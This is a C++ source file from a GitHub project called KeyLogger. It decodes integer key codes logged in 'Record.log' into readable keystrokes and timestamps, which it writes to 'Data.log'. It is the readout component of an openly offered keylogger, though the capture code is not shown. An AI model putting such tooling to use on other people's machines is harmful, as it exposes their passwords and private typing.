/**
* Developer: Minhas Kamal (minhaskamal024@gmail.com)
* Date: 15.Aug.2014
* License:  GNU General Public License version-3
* Website: https://github.com/MinhasKamal/KeyLogger
* Comment: An ASCII to character decoder for the recorded
*     key strokes.
**/

#include <stdio.h>
#include <time.h>
#include <iostream>

#define INPUT_FILE_NAME "Record.log"
#define OUTPUT_FILE_NAME "Data.log"

using namespace std;

char* decode(int i);


int main()
{
    FILE *file = fopen(INPUT_FILE_NAME, "a");
    fprintf(file, "0");
    fclose(file);

    FILE *inputFile, *outputFile;

    if((inputFile=fopen(INPUT_FILE_NAME, "r"))==NULL || (outputFile=fopen(OUTPUT_FILE_NAME, "a"))==NULL)
    {
        printf("ERROR!!!");
        return 1;
    }

    int num;
    char date[30];
    char ch = fgetc(inputFile);
    while(ch!=EOF)
    {

        if(ch=='\t')
        {
            fprintf(outputFile, ">>\n");
            //printf(">>\n");

            fscanf(inputFile, "%d", &num);
            while(num!=0)
            {
                fprintf(outputFile, "%s", decode(num));
                fscanf(inputFile, "%d", &num);
            }
        }
        else
        {
            fgets(date, 30, inputFile);
            fprintf(outputFile, "%c%s", ch, date);
        }

        ch = fgetc(inputFile);
    }

    fclose(inputFile);
    fclose(outputFile);

    return 0;
}


char* decode(int i)
{
    char* ch;

    switch(i)
    {
    case 1:
        ch="[LC]";
        break;
    case 2:
        ch="[RC]";
        break;
    case 3:
        ch="\n";
        break;
    case 8:
        ch="[<B]";
        break;
    case 9:
        ch="[TAB]";
        break;
    case 10:
        ch="\n";
        break;
    case 13:
        ch="\n";
        break;
    case 16:
        ch="[SH]";
        break;
    case 17:
        ch="[CTR]";
        break;
    case 18:
        ch="[ALT]";
        break;
    case 20:
        ch="[CAP]";
        break;
    case 19:
        ch="[PAUSE]";
        break;
    case 27:
        ch="[ESC]";
        break;
    case 32:
        ch=" ";
        break;
    case 33:
        ch="[PgU]";
        break;
    case 34:
        ch="[PgD]";
        break;
    case 35:
        ch="#";
        break;
    case 36:
        ch="$";
        break;
    case 37:
        ch="[L]";
        break;
    case 38:
        ch="[U]";
        break;
    case 39:
        ch="[R]";
        break;
    case 40:
        ch="[D]";
        break;
    case 41:
        ch=")";
        break;
    case 42:
        ch="*";
        break;
    case 43:
        ch="+";
        break;
    case 44:
        ch=",";
        break;
    case 45:
        ch="[INS]";
        break;
    case 46:
        ch="[DEL]";
        break;
    case 47:
        ch="/";
        break;
    case 48:
        ch="0";
        break;
    case 49:
        ch="1";
        break;
    case 50:
        ch="2";
        break;
    case 51:
        ch="3";
        break;
    case 52:
        ch="4";
        break;
    case 53:
        ch="5";
        break;
    case 54:
        ch="6";
        break;
    case 55:
        ch="7";
        break;
    case 56:
        ch="8";
        break;
    case 57:
        ch="9";
        break;
    case 58:
        ch=":";
        break;
    case 59:
        ch=";";
        break;
    case 60:
        ch="<";
        break;
    case 61:
        ch="=";
        break;
    case 62:
        ch=">";
        break;
    case 63:
        ch="?";
        break;
    case 64:
        ch="@";
        break;
    case 65:
        ch="a";
        break;
    case 66:
        ch="b";
        break;
    case 67:
        ch="c";
        break;
    case 68:
        ch="d";
        break;
    case 69:
        ch="e";
        break;
    case 70:
        ch="f";
        break;
    case 71:
        ch="g";
        break;
    case 72:
        ch="h";
        break;
    case 73:
        ch="i";
        break;
    case 74:
        ch="j";
        break;
    case 75:
        ch="k";
        break;
    case 76:
        ch="l";
        break;
    case 77:
        ch="m";
        break;
    case 78:
        ch="n";
        break;
    case 79:
        ch="o";
        break;
    case 80:
        ch="p";
        break;
    case 81:
        ch="q";
        break;
    case 82:
        ch="r";
        break;
    case 83:
        ch="s";
        break;
    case 84:
        ch="t";
        break;
    case 85:
        ch="u";
        break;
    case 86:
        ch="v";
        break;
    case 87:
        ch="w";
        break;
    case 88:
        ch="x";
        break;
    case 89:
        ch="y";
        break;
    case 90:
        ch="z";
        break;
    case 91:
        ch="[STRT]";
        break;
    case 92:
        ch="\\";
        break;
    case 93:
        ch="[MNU]";
        break;
    case 94:
        ch="^";
        break;
    case 95:
        ch="_";
        break;
    case 96:
        ch="0";
        break;
    case 97:
        ch="1";
        break;
    case 98:
        ch="2";
        break;
    case 99:
        ch="3";
        break;
    case 100:
        ch="4";
        break;
    case 101:
        ch="5";
        break;
    case 102:
        ch="6";
        break;
    case 103:
        ch="7";
        break;
    case 104:
        ch="8";
        break;
    case 105:
        ch="9";
        break;
    case 106:
        ch="*";
        break;
    case 107:
        ch="+";
        break;
    case 109:
        ch="-";
        break;
    case 110:
        ch=".";
        break;
    case 111:
        ch="/";
        break;
    case 112:
        ch="[F1]";
        break;
    case 113:
        ch="[F2]";
        break;
    case 114:
        ch="[F3]";
        break;
    case 115:
        ch="[F4]";
        break;
    case 116:
        ch="[F5]";
        break;
    case 117:
        ch="[F6]";
        break;
    case 118:
        ch="[F7]";
        break;
    case 119:
        ch="[F8]";
        break;
    case 120:
        ch="[F9]";
        break;
    case 121:
        ch="[F10]";
        break;
    case 122:
        ch="[F11]";
        break;
    case 123:
        ch="[F12]";
        break;
    case 124:
        ch="|";
        break;
    case 125:
        ch="}";
        break;
    case 126:
        ch="~";
        break;
    case 129:
        ch="[HOP]";
        break;
    case 144:
        ch="[NUM]";
        break;
    case 150:
        ch="-";
        break;
    /*
    case 151:
        ch="";
        break;
    case 152:
        ch="";
        break;
    case 153:
        ch="";
        break;
    case 154:
        ch="";
        break;
    case 155:
        ch="";
        break;
    case 156:
        ch="";
        break;
    case 157:
        ch="";
        break;
    case 158:
        ch="";
        break;
    case 159:
        ch="";
        break;
    case 160:
        ch="";
        break;
    case 161:
        ch="";
        break;
    case 162:
        ch="";  //[CTR]
        break;
    case 163:
        ch="";  //[CTR]
        break;
    case 164:
        ch="";  //[ALT]
        break;
    case 165:
        ch="";  //[ALT]
        break;
    case 166:
        ch="";
        break;
    case 167:
        ch="";
        break;
    case 168:
        ch="";
        break;
    case 169:
        ch="";
        break;
    case 170:
        ch="";
        break;
    case 171:
        ch="";
        break;
    case 172:
        ch="";
        break;
    case 173:
        ch="";
        break;
    case 174:
        ch="";
        break;
    case 175:
        ch="";
        break;
    case 176:
        ch="";
        break;
    case 177:
        ch="";
        break;
    case 178:
        ch="";
        break;
    case 179:
        ch="";
        break;
    case 180:
        ch="";
        break;
    case 181:
        ch="";
        break;
    case 182:
        ch="";
        break;
    case 183:
        ch="";
        break;
    case 184:
        ch="";
        break;
    case 185:
        ch="";
        break;
    */
    case 186:
        ch=";";
        break;
    case 187:
        ch="=";
        break;
    case 188:
        ch=",";
        break;
    case 189:
        ch="-";
        break;
    case 190:
        ch=".";
        break;
    case 191:
        ch="/";
        break;
    case 192:
        ch="`";
        break;
    /*
    case 193:
        ch="";
        break;
    case 194:
        ch="";
        break;
    case 195:
        ch="";
        break;
    case 196:
        ch="";
        break;
    case 197:
        ch="";
        break;
    case 198:
        ch="";
        break;
    case 199:
        ch="";
        break;
    case 200:
        ch="";
        break;
    case 201:
        ch="";
        break;
    case 202:
        ch="";
        break;
    case 203:
        ch="";
        break;
    case 204:
        ch="";
        break;
    case 205:
        ch="";
        break;
    case 206:
        ch="";
        break;
    case 207:
        ch="";
        break;
    case 208:
        ch="";
        break;
    case 209:
        ch="";
        break;
    case 210:
        ch="";
        break;
    case 211:
        ch="";
        break;
    case 212:
        ch="";
        break;
    case 213:
        ch="";
        break;
    case 214:
        ch="";
        break;
    case 215:
        ch="";
        break;
    case 216:
        ch="";
        break;
    case 217:
        ch="";
        break;
    case 218:
        ch="";
        break;
        */
    case 219:
        ch="[";
        break;
    case 220:
        ch="\\";
        break;
    case 221:
        ch="]";
        break;
    case 222:
        ch="'";
        break;
    /*
    case 223:
        ch="";
        break;
    case 224:
        ch="";
        break;
    case 225:
        ch="";
        break;
    case 226:
        ch="";
        break;
    case 227:
        ch="";
        break;
    case 228:
        ch="";
        break;
    case 229:
        ch="";
        break;
    case 230:
        ch="";
        break;
    case 231:
        ch="";
        break;
    case 232:
        ch="";
        break;
    case 233:
        ch="";
        break;
    case 234:
        ch="";
        break;
    case 235:
        ch="";
        break;
    case 236:
        ch="";
        break;
    case 237:
        ch="";
        break;
    case 238:
        ch="";
        break;
    case 239:
        ch="";
        break;
    case 240:
        ch="";
        break;
    case 241:
        ch="";
        break;
    case 242:
        ch="";
        break;
    case 243:
        ch="";
        break;
    case 244:
        ch="";
        break;
    case 245:
        ch="";
        break;
    case 246:
        ch="";
        break;
    case 247:
        ch="";
        break;
    case 248:
        ch="";
        break;
    case 249:
        ch="";
        break;
    case 250:
        ch="";
        break;
    */
    default:
        ch="[U?]";
    }

    return ch;
}
